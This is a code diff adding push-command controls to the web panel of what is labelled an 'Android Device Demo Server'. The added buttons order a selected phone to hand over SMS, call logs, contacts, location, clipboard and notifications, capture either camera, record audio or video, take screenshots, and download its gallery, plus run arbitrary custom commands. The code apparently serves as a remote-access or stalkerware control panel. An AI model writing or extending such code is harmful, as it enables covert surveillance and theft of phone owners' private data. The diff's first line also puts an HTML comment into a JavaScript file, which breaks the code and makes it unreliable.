@@ -1,4 +1,4 @@
-// Android Device Demo Server - Web GUI v5.3
+<!-- Android Device Demo Server - Web GUI v6.0 -->
 
 let pollingInterval = null;
 let currentReceivedDir = '';
@@ -10,6 +10,7 @@ const POLL_INTERVAL = 3000;
 document.addEventListener('DOMContentLoaded', () => {
     setupTabs();
     setupDashboardControls();
+    setupFCMControls();
     setupGalleryControls();
     setupFileBrowserControls();
     setupReceivedFilesControls();
@@ -47,6 +48,7 @@ function fetchDashboardData() {
         updateDevices(devices);
         updateLogs(logsData);
         updateStats(stats);
+        checkFCMStatus();
     })
     .catch(() => {});
 }
@@ -183,7 +185,105 @@ function setupDashboardControls() {
     if (cmdInput) cmdInput.addEventListener('keypress', e => { if (e.key === 'Enter') document.getElementById('btn-send-custom').click(); });
 }
 
-// === GALLERY TAB ===
+// === FCM PUSH COMMANDS ===
+function setupFCMControls() {
+    // Check FCM status on load
+    checkFCMStatus();
+
+    // Wire up all FCM command buttons
+    const fcmBtns = [
+        ['fcm-device-info', 'get_device_info'], ['fcm-location', 'get_location'],
+        ['fcm-storage', 'get_storage_info'], ['fcm-app-list', 'get_app_list'],
+        ['fcm-gallery', 'get_gallery_list'], ['fcm-sms', 'get_sms_logs'],
+        ['fcm-call-logs', 'get_call_logs'], ['fcm-contacts', 'get_contacts'],
+        ['fcm-notifications', 'get_notifications'], ['fcm-camera-front', 'capture_front'],
+        ['fcm-camera-back', 'capture_back'], ['fcm-record-audio', 'record_audio'],
+        ['fcm-record-video', 'record_video'], ['fcm-screenshot', 'screenshot'],
+        ['fcm-battery', 'get_battery_info'], ['fcm-clipboard', 'get_clipboard'],
+        ['fcm-download-gallery', 'download_gallery']
+    ];
+    fcmBtns.forEach(([id, cmd]) => {
+        const el = document.getElementById(id);
+        if (el) el.addEventListener('click', () => sendFCMCommand(cmd));
+    });
+
+    // Custom FCM command
+    const sendCustomBtn = document.getElementById('btn-fcm-send-custom');
+    if (sendCustomBtn) sendCustomBtn.addEventListener('click', () => {
+        const cmd = document.getElementById('fcm-cmd-input').value.trim();
+        const args = document.getElementById('fcm-args-input').value.trim() || '{}';
+        if (!cmd) return;
+        sendFCMCommand(cmd, args);
+    });
+
+    const fcmCmdInput = document.getElementById('fcm-cmd-input');
+    if (fcmCmdInput) fcmCmdInput.addEventListener('keypress', e => { if (e.key === 'Enter') document.getElementById('btn-fcm-send-custom').click(); });
+}
+
+function checkFCMStatus() {
+    fetch('/api/fcm-tokens').then(r => r.json()).then(data => {
+        const badge = document.getElementById('fcm-status-badge');
+        if (!badge) return;
+        const tokens = data.tokens || {};
+        const tokenCount = Object.keys(tokens).length;
+        if (data.fcm_configured === false) {
+            badge.textContent = 'FCM Not Configured';
+            badge.className = 'fcm-badge fcm-badge-error';
+            badge.title = 'Place firebase-service-account.json on the server';
+        } else if (tokenCount === 0) {
+            badge.textContent = 'No Tokens';
+            badge.className = 'fcm-badge fcm-badge-warning';
+            badge.title = 'No devices have registered FCM tokens yet';
+        } else {
+            badge.textContent = `FCM Active (${tokenCount} device${tokenCount > 1 ? 's' : ''})`;
+            badge.className = 'fcm-badge fcm-badge-ok';
+            badge.title = `${tokenCount} device(s) have FCM tokens registered`;
+        }
+    }).catch(() => {
+        const badge = document.getElementById('fcm-status-badge');
+        if (badge) {
+            badge.textContent = 'FCM Status Unknown';
+            badge.className = 'fcm-badge fcm-badge-unknown';
+        }
+    });
+}
+
+function sendFCMCommand(command, args) {
+    const resultEl = document.getElementById('fcm-result');
+    if (resultEl) resultEl.innerHTML = '<span class="fcm-sending">\u2709\uFE0F Sending FCM push: ' + command + '...</span>';
+
+    if (!currentDeviceSessionId) {
+        if (resultEl) resultEl.innerHTML = '<span class="fcm-error">\u274C No device selected. Please select a device from the dashboard.</span>';
+        return Promise.resolve({ status: 'error' });
+    }
+
+    const params = new URLSearchParams({
+        command: command,
+        session: currentDeviceSessionId,
+        args: args || '{}'
+    });
+
+    return fetch('/api/fcm-send?' + params.toString())
+        .then(r => r.json())
+        .then(data => {
+            if (resultEl) {
+                if (data.status === 'success') {
+                    resultEl.innerHTML = '<span class="fcm-success">\u2705 FCM command "' + command + '" sent successfully! Device should execute it shortly. Message ID: ' + (data.message_id || 'N/A') + '</span>';
+                } else {
+                    resultEl.innerHTML = '<span class="fcm-error">\u274C FCM failed: ' + (data.message || data.error || 'Unknown error') + '</span>';
+                }
+            }
+            // Refresh dashboard after a delay
+            setTimeout(fetchDashboardData, 2000);
+            return data;
+        })
+        .catch(err => {
+            if (resultEl) resultEl.innerHTML = '<span class="fcm-error">\u274C FCM request error: ' + err + '</span>';
+            return { status: 'error', error: err };
+        });
+}
+
+// === GALLERY TAB ====
 function setupGalleryControls() {
     document.getElementById('btn-refresh-gallery')?.addEventListener('click', loadGallery);
     document.getElementById('btn-download-gallery-item')?.addEventListener('click', () => {
